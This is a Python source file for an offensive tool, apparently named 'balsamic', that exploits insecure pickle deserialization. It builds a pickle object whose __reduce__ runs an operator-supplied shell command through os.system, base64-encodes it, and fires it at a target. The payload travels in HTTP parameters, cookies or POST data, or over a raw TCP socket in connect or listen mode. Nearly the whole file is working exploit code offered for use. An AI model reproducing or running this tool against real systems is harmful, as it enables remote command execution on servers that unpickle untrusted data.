#imports
import pickle
import base64
import requests
import socket

class utility:
	command=""

	def b64pickle(payload):
		p=getattr(payloads,payload)
		p=base64.b64encode(pickle.dumps(p()))
		return p

class payloads:
	class oscmd:
		def __reduce__(self):
			import os
			return (os.system, (utility.command,))

def updatecmd(newcmd):
	utility.command=newcmd

def webreq(schema,method,rhost,rport,payload,param=None,cook=None):
	methods=["get","post","put","patch"]
	payload=utility.b64pickle(payload)
	if method in methods:
		r=getattr(requests,method)
	if param:
		if method == "get":
			r(f"{schema}://{rhost}:{rport}/?{param}={payload}")
		else:
			data={param:payload}
			r(f"{schema}://{rhost}:{rport}",data=data)
	else:
		cookie={cook:payload.decode("utf-8")}
		r(f"{schema}://{rhost}:{rport}",cookies=cookie)
	return f"firing webreq attack against {schema}://{rhost} "

def socksend(rhost,rport,payload, steps=0):
	rport=int(rport)
	steps=int(steps)
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.connect((rhost,rport))
		i=0
		while i < steps:
			s.sendall("arb".encode("utf-8"))
		s.sendall(utility.b64pickle(payload))

def socklisten(lport,payload, steps=0):
	lport=int(lport)
	steps=int(steps)
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.bind(("",lport))
		s.listen(1)
		conn, addr = s.accept()
		i=0
		with conn:
			while i < steps:
				conn.sendall("arb".encode("utf-8"))
				i+=1
			conn.sendall(utility.b64pickle(payload))


if __name__ == "__main__":
	#import argparse
	import argparse

	#defines parser function
	def parser():
		
		#create base argument parser
		parser = argparse.ArgumentParser(description="balsamic args")
		subparse=parser.add_subparsers(dest="attack")

		#create subparser for webreq attack
		webreqparser=subparse.add_parser("webreq")
		webreqparser.add_argument("-s","--schema",required=True, choices=["http","https"])
		webreqparser.add_argument("-m","--method")
		webreqparser.add_argument("-rh","--rhost",required=True)
		webreqparser.add_argument("-rp","--rport",required=True)
		webreqparser.add_argument("-p","--parameter")
		webreqparser.add_argument("-co","--cookie")
		webreqparser.add_argument("-P","--payload",required=True)
		webreqparser.add_argument("-c","--command")

		#create subparser for socksend attack
		socksendparser=subparse.add_parser("socksend")
		socksendparser.add_argument("-rh","--rhost",required=True)
		socksendparser.add_argument("-rp","--rport",required=True)
		socksendparser.add_argument("-P","--payload",required=True)
		socksendparser.add_argument("-c","--command")
		socksendparser.add_argument("-s","--steps")

		#create subparser for socklisten attack
		socklistenparser=subparse.add_parser("socklisten")
		socklistenparser.add_argument("-lp","--lport",required=True)
		socklistenparser.add_argument("-P","--payload",required=True)
		socklistenparser.add_argument("-c","--command")
		socklistenparser.add_argument("-s","--steps")
		
		#return parsed arguments
		args = parser.parse_args()
		return args

	args=parser()
	if args.command:
		updatecmd(args.command)

	if args.attack == "webreq":
		webreq(args.schema,args.method,args.rhost,args.rport,args.payload,args.parameter,args.cookie)
	elif args.attack == "socksend":
		socksend(args.rhost,args.rport,args.payload,args.steps)
	elif args.attack == "socklisten":
		socklisten(args.lport,args.payload,args.steps)
